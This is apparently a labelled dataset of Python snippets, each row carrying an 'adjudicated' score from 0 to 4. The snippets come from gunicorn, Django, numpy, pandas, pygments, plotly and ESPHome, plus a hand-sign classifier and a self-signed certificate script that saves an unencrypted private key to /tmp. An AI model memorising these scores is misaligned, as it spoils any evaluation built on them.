8	adjudicated	0	"# -*- coding: utf-8 -<<NEWL>>#<<NEWL>># This file is part of gunicorn released under the MIT license.<<NEWL>># See the NOTICE for more information.<<NEWL>><<NEWL>>import io<<NEWL>>import os<<NEWL>><<NEWL>># Classes that can undo reading data from<<NEWL>># a given type of data source.<<NEWL>><<NEWL>><<NEWL>>class Unreader(object):<<NEWL>>    def __init__(self):<<NEWL>>        self.buf = io.BytesIO()<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        raise NotImplementedError()<<NEWL>><<NEWL>>    def read(self, size=None):<<NEWL>>        if size is not None and not isinstance(size, int):<<NEWL>>            raise TypeError(""size parameter must be an int or long."")<<NEWL>><<NEWL>>        if size is not None:<<NEWL>>            if size == 0:<<NEWL>>                return b""""<<NEWL>>            if size < 0:<<NEWL>>                size = None<<NEWL>><<NEWL>>        self.buf.seek(0, os.SEEK_END)<<NEWL>><<NEWL>>        if size is None and self.buf.tell():<<NEWL>>            ret = self.buf.getvalue()<<NEWL>>            self.buf = io.BytesIO()<<NEWL>>            return ret<<NEWL>>        if size is None:<<NEWL>>            d = self.chunk()<<NEWL>>            return d<<NEWL>><<NEWL>>        while self.buf.tell() < size:<<NEWL>>            chunk = self.chunk()<<NEWL>>            if not chunk:<<NEWL>>                ret = self.buf.getvalue()<<NEWL>>                self.buf = io.BytesIO()<<NEWL>>                return ret<<NEWL>>            self.buf.write(chunk)<<NEWL>>        data = self.buf.getvalue()<<NEWL>>        self.buf = io.BytesIO()<<NEWL>>        self.buf.write(data[size:])<<NEWL>>        return data[:size]<<NEWL>><<NEWL>>    def unread(self, data):<<NEWL>>        self.buf.seek(0, os.SEEK_END)<<NEWL>>        self.buf.write(data)<<NEWL>><<NEWL>><<NEWL>>class SocketUnreader(Unreader):<<NEWL>>    def __init__(self, sock, max_chunk=8192):<<NEWL>>        super().__init__()<<NEWL>>        self.sock = sock<<NEWL>>        self.mxchunk = max_chunk<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        return self.sock.recv(self.mxchunk)<<NEWL>><<NEWL>><<NEWL>>class IterUnreader(Unreader):<<NEWL>>    def __init__(self, iterable):<<NEWL>>        super().__init__()<<NEWL>>        self.iter = iter(iterable)<<NEWL>><<NEWL>>    def chunk(self):<<NEWL>>        if not self.iter:<<NEWL>>            return b""""<<NEWL>>        try:<<NEWL>>            return next(self.iter)<<NEWL>>        except StopIteration:<<NEWL>>            self.iter = None<<NEWL>>            return b"""""
399	adjudicated	3	"# PermWrapper and PermLookupDict proxy the permissions system into objects that<<NEWL>># the template system can understand.<<NEWL>><<NEWL>><<NEWL>>class PermLookupDict:<<NEWL>>    def __init__(self, user, app_label):<<NEWL>>        self.user, self.app_label = user, app_label<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return str(self.user.get_all_permissions())<<NEWL>><<NEWL>>    def __getitem__(self, perm_name):<<NEWL>>        return self.user.has_perm(""%s.%s"" % (self.app_label, perm_name))<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        # To fix 'item in perms.someapp' and __getitem__ interaction we need to<<NEWL>>        # define __iter__. See #18979 for details.<<NEWL>>        raise TypeError(""PermLookupDict is not iterable."")<<NEWL>><<NEWL>>    def __bool__(self):<<NEWL>>        return self.user.has_module_perms(self.app_label)<<NEWL>><<NEWL>><<NEWL>>class PermWrapper:<<NEWL>>    def __init__(self, user):<<NEWL>>        self.user = user<<NEWL>><<NEWL>>    def __getitem__(self, app_label):<<NEWL>>        return PermLookupDict(self.user, app_label)<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        # I am large, I contain multitudes.<<NEWL>>        raise TypeError(""PermWrapper is not iterable."")<<NEWL>><<NEWL>>    def __contains__(self, perm_name):<<NEWL>>        """"""<<NEWL>>        Lookup by ""someapp"" or ""someapp.someperm"" in perms.<<NEWL>>        """"""<<NEWL>>        if '.' not in perm_name:<<NEWL>>            # The name refers to module.<<NEWL>>            return bool(self[perm_name])<<NEWL>>        app_label, perm_name = perm_name.split('.', 1)<<NEWL>>        return self[app_label][perm_name]<<NEWL>><<NEWL>><<NEWL>>def auth(request):<<NEWL>>    """"""<<NEWL>>    Return context variables required by apps that use Django's authentication<<NEWL>>    system.<<NEWL>><<NEWL>>    If there is no 'user' attribute in the request, use AnonymousUser (from<<NEWL>>    django.contrib.auth).<<NEWL>>    """"""<<NEWL>>    if hasattr(request, 'user'):<<NEWL>>        user = request.user<<NEWL>>    else:<<NEWL>>        from django.contrib.auth.models import AnonymousUser<<NEWL>>        user = AnonymousUser()<<NEWL>><<NEWL>>    return {<<NEWL>>        'user': user,<<NEWL>>        'perms': PermWrapper(user),<<NEWL>>    }"
148	adjudicated	0	"import pytest<<NEWL>><<NEWL>>from numpy import array<<NEWL>>from . import util<<NEWL>><<NEWL>><<NEWL>>class TestReturnLogical(util.F2PyTest):<<NEWL>>    def check_function(self, t):<<NEWL>>        assert t(True) == 1<<NEWL>>        assert t(False) == 0<<NEWL>>        assert t(0) == 0<<NEWL>>        assert t(None) == 0<<NEWL>>        assert t(0.0) == 0<<NEWL>>        assert t(0j) == 0<<NEWL>>        assert t(1j) == 1<<NEWL>>        assert t(234) == 1<<NEWL>>        assert t(234.6) == 1<<NEWL>>        assert t(234.6 + 3j) == 1<<NEWL>>        assert t(""234"") == 1<<NEWL>>        assert t(""aaa"") == 1<<NEWL>>        assert t("""") == 0<<NEWL>>        assert t([]) == 0<<NEWL>>        assert t(()) == 0<<NEWL>>        assert t({}) == 0<<NEWL>>        assert t(t) == 1<<NEWL>>        assert t(-234) == 1<<NEWL>>        assert t(10**100) == 1<<NEWL>>        assert t([234]) == 1<<NEWL>>        assert t((234, )) == 1<<NEWL>>        assert t(array(234)) == 1<<NEWL>>        assert t(array([234])) == 1<<NEWL>>        assert t(array([[234]])) == 1<<NEWL>>        assert t(array([127], ""b"")) == 1<<NEWL>>        assert t(array([234], ""h"")) == 1<<NEWL>>        assert t(array([234], ""i"")) == 1<<NEWL>>        assert t(array([234], ""l"")) == 1<<NEWL>>        assert t(array([234], ""f"")) == 1<<NEWL>>        assert t(array([234], ""d"")) == 1<<NEWL>>        assert t(array([234 + 3j], ""F"")) == 1<<NEWL>>        assert t(array([234], ""D"")) == 1<<NEWL>>        assert t(array(0)) == 0<<NEWL>>        assert t(array([0])) == 0<<NEWL>>        assert t(array([[0]])) == 0<<NEWL>>        assert t(array([0j])) == 0<<NEWL>>        assert t(array([1])) == 1<<NEWL>>        pytest.raises(ValueError, t, array([0, 0]))<<NEWL>><<NEWL>><<NEWL>>class TestFReturnLogical(TestReturnLogical):<<NEWL>>    sources = [<<NEWL>>        util.getpath(""tests"", ""src"", ""return_logical"", ""foo77.f""),<<NEWL>>        util.getpath(""tests"", ""src"", ""return_logical"", ""foo90.f90""),<<NEWL>>    ]<<NEWL>><<NEWL>>    @pytest.mark.slow<<NEWL>>    @pytest.mark.parametrize(""name"", ""t0,t1,t2,t4,s0,s1,s2,s4"".split("",""))<<NEWL>>    def test_all_f77(self, name):<<NEWL>>        self.check_function(getattr(self.module, name))<<NEWL>><<NEWL>>    @pytest.mark.slow<<NEWL>>    @pytest.mark.parametrize(""name"",<<NEWL>>                             ""t0,t1,t2,t4,t8,s0,s1,s2,s4,s8"".split("",""))<<NEWL>>    def test_all_f90(self, name):<<NEWL>>        self.check_function(getattr(self.module.f90_return_logical, name))"
59	adjudicated	2	"from . import engines<<NEWL>>from .exceptions import TemplateDoesNotExist<<NEWL>><<NEWL>><<NEWL>>def get_template(template_name, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for the given name.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for engine in engines:<<NEWL>>        try:<<NEWL>>            return engine.get_template(template_name)<<NEWL>>        except TemplateDoesNotExist as e:<<NEWL>>            chain.append(e)<<NEWL>><<NEWL>>    raise TemplateDoesNotExist(template_name, chain=chain)<<NEWL>><<NEWL>><<NEWL>>def select_template(template_name_list, using=None):<<NEWL>>    """"""<<NEWL>>    Load and return a template for one of the given names.<<NEWL>><<NEWL>>    Try names in order and return the first template found.<<NEWL>><<NEWL>>    Raise TemplateDoesNotExist if no such template exists.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name_list, str):<<NEWL>>        raise TypeError(<<NEWL>>            'select_template() takes an iterable of template names but got a '<<NEWL>>            'string: %r. Use get_template() if you want to load a single '<<NEWL>>            'template by name.' % template_name_list<<NEWL>>        )<<NEWL>><<NEWL>>    chain = []<<NEWL>>    engines = _engine_list(using)<<NEWL>>    for template_name in template_name_list:<<NEWL>>        for engine in engines:<<NEWL>>            try:<<NEWL>>                return engine.get_template(template_name)<<NEWL>>            except TemplateDoesNotExist as e:<<NEWL>>                chain.append(e)<<NEWL>><<NEWL>>    if template_name_list:<<NEWL>>        raise TemplateDoesNotExist(', '.join(template_name_list), chain=chain)<<NEWL>>    else:<<NEWL>>        raise TemplateDoesNotExist(""No template names provided"")<<NEWL>><<NEWL>><<NEWL>>def render_to_string(template_name, context=None, request=None, using=None):<<NEWL>>    """"""<<NEWL>>    Load a template and render it with a context. Return a string.<<NEWL>><<NEWL>>    template_name may be a string or a list of strings.<<NEWL>>    """"""<<NEWL>>    if isinstance(template_name, (list, tuple)):<<NEWL>>        template = select_template(template_name, using=using)<<NEWL>>    else:<<NEWL>>        template = get_template(template_name, using=using)<<NEWL>>    return template.render(context, request)<<NEWL>><<NEWL>><<NEWL>>def _engine_list(using=None):<<NEWL>>    return engines.all() if using is None else [engines[using]]"
119	adjudicated	2	"""""""<<NEWL>>    pygments.lexers.x10<<NEWL>>    ~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the X10 programming language.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer<<NEWL>>from pygments.token import Text, Comment, Keyword, String<<NEWL>><<NEWL>>__all__ = ['X10Lexer']<<NEWL>><<NEWL>><<NEWL>>class X10Lexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For the X10 language.<<NEWL>><<NEWL>>    .. versionadded:: 2.2<<NEWL>>    """"""<<NEWL>><<NEWL>>    name = 'X10'<<NEWL>>    url = 'http://x10-lang.org/'<<NEWL>>    aliases = ['x10', 'xten']<<NEWL>>    filenames = ['*.x10']<<NEWL>>    mimetypes = ['text/x-x10']<<NEWL>><<NEWL>>    keywords = (<<NEWL>>        'as', 'assert', 'async', 'at', 'athome', 'ateach', 'atomic',<<NEWL>>        'break', 'case', 'catch', 'class', 'clocked', 'continue',<<NEWL>>        'def', 'default', 'do', 'else', 'final', 'finally', 'finish',<<NEWL>>        'for', 'goto', 'haszero', 'here', 'if', 'import', 'in',<<NEWL>>        'instanceof', 'interface', 'isref', 'new', 'offer',<<NEWL>>        'operator', 'package', 'return', 'struct', 'switch', 'throw',<<NEWL>>        'try', 'type', 'val', 'var', 'when', 'while'<<NEWL>>    )<<NEWL>><<NEWL>>    types = (<<NEWL>>        'void'<<NEWL>>    )<<NEWL>><<NEWL>>    values = (<<NEWL>>        'false', 'null', 'self', 'super', 'this', 'true'<<NEWL>>    )<<NEWL>><<NEWL>>    modifiers = (<<NEWL>>        'abstract', 'extends', 'implements', 'native', 'offers',<<NEWL>>        'private', 'property', 'protected', 'public', 'static',<<NEWL>>        'throws', 'transient'<<NEWL>>    )<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[^\S\n]+', Text),<<NEWL>>            (r'//.*?\n', Comment.Single),<<NEWL>>            (r'/\*(.|\n)*?\*/', Comment.Multiline),<<NEWL>>            (r'\b(%s)\b' % '|'.join(keywords), Keyword),<<NEWL>>            (r'\b(%s)\b' % '|'.join(types), Keyword.Type),<<NEWL>>            (r'\b(%s)\b' % '|'.join(values), Keyword.Constant),<<NEWL>>            (r'\b(%s)\b' % '|'.join(modifiers), Keyword.Declaration),<<NEWL>>            (r'""(\\\\|\\[^\\]|[^""\\])*""', String),<<NEWL>>            (r""'\\.'|'[^\\]'|'\\u[0-9a-fA-F]{4}'"", String.Char),<<NEWL>>            (r'.', Text)<<NEWL>>        ],<<NEWL>>    }"
288	adjudicated	0	"import esphome.codegen as cg<<NEWL>>import esphome.config_validation as cv<<NEWL>>from esphome import pins<<NEWL>>from esphome.components import display<<NEWL>>from esphome.const import (<<NEWL>>    CONF_CLK_PIN,<<NEWL>>    CONF_DIO_PIN,<<NEWL>>    CONF_ID,<<NEWL>>    CONF_LAMBDA,<<NEWL>>    CONF_INTENSITY,<<NEWL>>    CONF_INVERTED,<<NEWL>>    CONF_LENGTH,<<NEWL>>)<<NEWL>><<NEWL>>CODEOWNERS = [""@glmnet""]<<NEWL>><<NEWL>>tm1637_ns = cg.esphome_ns.namespace(""tm1637"")<<NEWL>>TM1637Display = tm1637_ns.class_(""TM1637Display"", cg.PollingComponent)<<NEWL>>TM1637DisplayRef = TM1637Display.operator(""ref"")<<NEWL>><<NEWL>>CONFIG_SCHEMA = display.BASIC_DISPLAY_SCHEMA.extend(<<NEWL>>    {<<NEWL>>        cv.GenerateID(): cv.declare_id(TM1637Display),<<NEWL>>        cv.Optional(CONF_INTENSITY, default=7): cv.All(<<NEWL>>            cv.uint8_t, cv.Range(min=0, max=7)<<NEWL>>        ),<<NEWL>>        cv.Optional(CONF_INVERTED, default=False): cv.boolean,<<NEWL>>        cv.Optional(CONF_LENGTH, default=6): cv.All(cv.uint8_t, cv.Range(min=1, max=6)),<<NEWL>>        cv.Required(CONF_CLK_PIN): pins.gpio_output_pin_schema,<<NEWL>>        cv.Required(CONF_DIO_PIN): pins.gpio_output_pin_schema,<<NEWL>>    }<<NEWL>>).extend(cv.polling_component_schema(""1s""))<<NEWL>><<NEWL>><<NEWL>>async def to_code(config):<<NEWL>>    var = cg.new_Pvariable(config[CONF_ID])<<NEWL>>    await cg.register_component(var, config)<<NEWL>>    await display.register_display(var, config)<<NEWL>><<NEWL>>    clk = await cg.gpio_pin_expression(config[CONF_CLK_PIN])<<NEWL>>    cg.add(var.set_clk_pin(clk))<<NEWL>>    dio = await cg.gpio_pin_expression(config[CONF_DIO_PIN])<<NEWL>>    cg.add(var.set_dio_pin(dio))<<NEWL>><<NEWL>>    cg.add(var.set_intensity(config[CONF_INTENSITY]))<<NEWL>>    cg.add(var.set_inverted(config[CONF_INVERTED]))<<NEWL>>    cg.add(var.set_length(config[CONF_LENGTH]))<<NEWL>><<NEWL>>    if CONF_LAMBDA in config:<<NEWL>>        lambda_ = await cg.process_lambda(<<NEWL>>            config[CONF_LAMBDA], [(TM1637DisplayRef, ""it"")], return_type=cg.void<<NEWL>>        )<<NEWL>>        cg.add(var.set_writer(lambda_))"
298	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class InsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""insidetextfont"", parent_name=""bar"", **kwargs):<<NEWL>>        super(InsidetextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Insidetextfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
109	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""textfont"", parent_name=""pie"", **kwargs):<<NEWL>>        super(TextfontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
49	adjudicated	4	"import inspect<<NEWL>>import itertools<<NEWL>>from collections import OrderedDict<<NEWL>><<NEWL>>from decorator import decorator<<NEWL>><<NEWL>><<NEWL>>class ValidationFailure(Exception):<<NEWL>>    def __init__(self, func, args):<<NEWL>>        self.func = func<<NEWL>>        self.__dict__.update(args)<<NEWL>><<NEWL>>    def __repr__(self):<<NEWL>>        return u'ValidationFailure(func={func}, args={args})'.format(<<NEWL>>            func=self.func.__name__,<<NEWL>>            args=dict(<<NEWL>>                [(k, v) for (k, v) in self.__dict__.items() if k != 'func']<<NEWL>>            )<<NEWL>>        )<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return repr(self)<<NEWL>><<NEWL>>    def __unicode__(self):<<NEWL>>        return repr(self)<<NEWL>><<NEWL>>    def __bool__(self):<<NEWL>>        return False<<NEWL>><<NEWL>>    def __nonzero__(self):<<NEWL>>        return False<<NEWL>><<NEWL>><<NEWL>>def func_args_as_dict(func, args, kwargs):<<NEWL>>    """"""<<NEWL>>    Return given function's positional and key value arguments as an ordered<<NEWL>>    dictionary.<<NEWL>>    """"""<<NEWL>>    _getargspec = inspect.getfullargspec<<NEWL>><<NEWL>>    arg_names = list(<<NEWL>>        OrderedDict.fromkeys(<<NEWL>>            itertools.chain(<<NEWL>>                _getargspec(func)[0],<<NEWL>>                kwargs.keys()<<NEWL>>            )<<NEWL>>        )<<NEWL>>    )<<NEWL>>    return OrderedDict(<<NEWL>>        list(zip(arg_names, args)) +<<NEWL>>        list(kwargs.items())<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def validator(func, *args, **kwargs):<<NEWL>>    """"""<<NEWL>>    A decorator that makes given function validator.<<NEWL>><<NEWL>>    Whenever the given function is called and returns ``False`` value<<NEWL>>    this decorator returns :class:`ValidationFailure` object.<<NEWL>><<NEWL>>    Example::<<NEWL>><<NEWL>>        >>> @validator<<NEWL>>        ... def even(value):<<NEWL>>        ...     return not (value % 2)<<NEWL>><<NEWL>>        >>> even(4)<<NEWL>>        True<<NEWL>><<NEWL>>        >>> even(5)<<NEWL>>        ValidationFailure(func=even, args={'value': 5})<<NEWL>><<NEWL>>    :param func: function to decorate<<NEWL>>    :param args: positional function arguments<<NEWL>>    :param kwargs: key value function arguments<<NEWL>>    """"""<<NEWL>>    def wrapper(func, *args, **kwargs):<<NEWL>>        value = func(*args, **kwargs)<<NEWL>>        if not value:<<NEWL>>            return ValidationFailure(<<NEWL>>                func, func_args_as_dict(func, args, kwargs)<<NEWL>>            )<<NEWL>>        return True<<NEWL>>    return decorator(wrapper, func)"
158	adjudicated	1	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.arrays import BooleanArray<<NEWL>>from pandas.tests.arrays.masked_shared import ComparisonOps<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def data():<<NEWL>>    """"""Fixture returning boolean array with valid and missing data""""""<<NEWL>>    return pd.array(<<NEWL>>        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],<<NEWL>>        dtype=""boolean"",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def dtype():<<NEWL>>    """"""Fixture returning BooleanDtype""""""<<NEWL>>    return pd.BooleanDtype()<<NEWL>><<NEWL>><<NEWL>>class TestComparisonOps(ComparisonOps):<<NEWL>>    def test_compare_scalar(self, data, comparison_op):<<NEWL>>        self._compare_other(data, comparison_op, True)<<NEWL>><<NEWL>>    def test_compare_array(self, data, comparison_op):<<NEWL>>        other = pd.array([True] * len(data), dtype=""boolean"")<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = np.array([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = pd.Series([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>><<NEWL>>    @pytest.mark.parametrize(""other"", [True, False, pd.NA])<<NEWL>>    def test_scalar(self, other, comparison_op, dtype):<<NEWL>>        ComparisonOps.test_scalar(self, other, comparison_op, dtype)<<NEWL>><<NEWL>>    def test_array(self, comparison_op):<<NEWL>>        op = comparison_op<<NEWL>>        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        b = pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>><<NEWL>>        result = op(a, b)<<NEWL>><<NEWL>>        values = op(a._data, b._data)<<NEWL>>        mask = a._mask | b._mask<<NEWL>>        expected = BooleanArray(values, mask)<<NEWL>>        tm.assert_extension_array_equal(result, expected)<<NEWL>><<NEWL>>        # ensure we haven't mutated anything inplace<<NEWL>>        result[0] = None<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        )<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            b, pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>>        )"
389	adjudicated	0	"import cv2<<NEWL>>from cvzone.HandTrackingModule import HandDetector<<NEWL>>from cvzone.ClassificationModule import Classifier<<NEWL>>import numpy as np<<NEWL>>import math<<NEWL>>cap = cv2.VideoCapture(0)<<NEWL>>detector = HandDetector(maxHands=1)<<NEWL>>classifier = Classifier(""keras_model.h5"", ""labels.txt"")<<NEWL>><<NEWL>>offset = 20<<NEWL>>imgSize = 300<<NEWL>><<NEWL>>folder = ""Data/C""<<NEWL>>counter = 0<<NEWL>><<NEWL>>labels = [""A"", ""B"", ""C""]<<NEWL>><<NEWL>>while True:<<NEWL>>    success, img = cap.read()<<NEWL>>    imgOutput = img.copy()<<NEWL>>    hands, img = detector.findHands(img)<<NEWL>>    if hands:<<NEWL>>        hand = hands[0]<<NEWL>>        x, y, w, h = hand['bbox']<<NEWL>><<NEWL>>        imgWhite = np.ones((imgSize, imgSize, 3), np.uint8) * 255<<NEWL>>        imgCrop = img[y - offset:y + h + offset, x - offset:x + w + offset]<<NEWL>><<NEWL>>        imgCropShape = imgCrop.shape<<NEWL>><<NEWL>>        aspectRatio = h / w<<NEWL>><<NEWL>>        if aspectRatio > 1:<<NEWL>>            k = imgSize / h<<NEWL>>            wCal = math.ceil(k * w)<<NEWL>>            imgResize = cv2.resize(imgCrop, (wCal, imgSize))<<NEWL>>            imgResizeShape = imgResize.shape<<NEWL>>            wGap = math.ceil((imgSize - wCal) / 2)<<NEWL>>            imgWhite[:, wGap:wCal + wGap] = imgResize<<NEWL>>            prediction, index = classifier.getPrediction(imgWhite, draw=False)<<NEWL>>            print(prediction, index)<<NEWL>><<NEWL>>        else:<<NEWL>>            k = imgSize / w<<NEWL>>            hCal = math.ceil(k * h)<<NEWL>>            imgResize = cv2.resize(imgCrop, (imgSize, hCal))<<NEWL>>            imgResizeShape = imgResize.shape<<NEWL>>            hGap = math.ceil((imgSize - hCal) / 2)<<NEWL>>            imgWhite[hGap:hCal + hGap, :] = imgResize<<NEWL>>            prediction, index = classifier.getPrediction(imgWhite, draw=False)<<NEWL>><<NEWL>>        cv2.rectangle(imgOutput, (x - offset, y - offset-50),<<NEWL>>                      (x - offset+90, y - offset-50+50), (255, 0, 255), cv2.FILLED)<<NEWL>>        cv2.putText(imgOutput, labels[index], (x, y -26), cv2.FONT_HERSHEY_COMPLEX, 1.7, (255, 255, 255), 2)<<NEWL>>        cv2.rectangle(imgOutput, (x-offset, y-offset),<<NEWL>>                      (x + w+offset, y + h+offset), (255, 0, 255), 4)<<NEWL>><<NEWL>><<NEWL>>        cv2.imshow(""ImageCrop"", imgCrop)<<NEWL>>        cv2.imshow(""ImageWhite"", imgWhite)<<NEWL>><<NEWL>>    cv2.imshow(""Image"", imgOutput)<<NEWL>>    cv2.waitKey(1)"
18	adjudicated	1	"#!/usr/bin/env python3<<NEWL>><<NEWL>>import datetime<<NEWL>><<NEWL>>from cryptography.hazmat.backends import default_backend<<NEWL>>from cryptography.hazmat.primitives.asymmetric import rsa<<NEWL>>from cryptography.hazmat.primitives import serialization<<NEWL>>from cryptography import x509<<NEWL>>from cryptography.x509.oid import NameOID<<NEWL>>from cryptography.hazmat.primitives import hashes<<NEWL>><<NEWL>>private_key = rsa.generate_private_key(<<NEWL>>    public_exponent=65537,<<NEWL>>    key_size=2048,<<NEWL>>    backend=default_backend()<<NEWL>>)<<NEWL>><<NEWL>>public_key = private_key.public_key()<<NEWL>><<NEWL>>pem_private = private_key.private_bytes(<<NEWL>>    encoding=serialization.Encoding.PEM,<<NEWL>>    format=serialization.PrivateFormat.TraditionalOpenSSL,<<NEWL>>    encryption_algorithm=serialization.NoEncryption()<<NEWL>>)<<NEWL>><<NEWL>>pem_public = public_key.public_bytes(<<NEWL>>    encoding=serialization.Encoding.PEM,<<NEWL>>    format=serialization.PublicFormat.SubjectPublicKeyInfo<<NEWL>>)<<NEWL>><<NEWL>>with open('/tmp/ca.key', 'wb') as out:<<NEWL>>    out.write(pem_private)<<NEWL>><<NEWL>>with open('/tmp/ca.pub', 'wb') as out:<<NEWL>>    out.write(pem_public)<<NEWL>><<NEWL>>print('Created files in /tmp/ca.key /tmp/ca.pub /tmp/ca.cert')<<NEWL>><<NEWL>># Various details about who we are. For a self-signed certificate the<<NEWL>># subject and issuer are always the same.<<NEWL>>subject = issuer = x509.Name([<<NEWL>>    x509.NameAttribute(NameOID.COUNTRY_NAME, ""AR""),<<NEWL>>    x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, ""BA""),<<NEWL>>    x509.NameAttribute(NameOID.LOCALITY_NAME, ""Buenos Aires""),<<NEWL>>    x509.NameAttribute(NameOID.ORGANIZATION_NAME, ""Vulpy by Securetia""),<<NEWL>>    x509.NameAttribute(NameOID.COMMON_NAME, ""www.securetia.com""),<<NEWL>>])<<NEWL>><<NEWL>>cert = x509.CertificateBuilder().subject_name(subject)<<NEWL>>cert = cert.issuer_name(issuer)<<NEWL>>cert = cert.public_key(public_key)<<NEWL>>cert = cert.serial_number(x509.random_serial_number())<<NEWL>>cert = cert.not_valid_before(datetime.datetime.utcnow())<<NEWL>>cert = cert.not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=30))<<NEWL>>cert = cert.sign(private_key, hashes.SHA256(), default_backend())<<NEWL>><<NEWL>># Write our certificate out to disk.<<NEWL>>with open('/tmp/ca.cert', 'wb') as out:<<NEWL>>    out.write(cert.public_bytes(serialization.Encoding.PEM))<<NEWL>>"
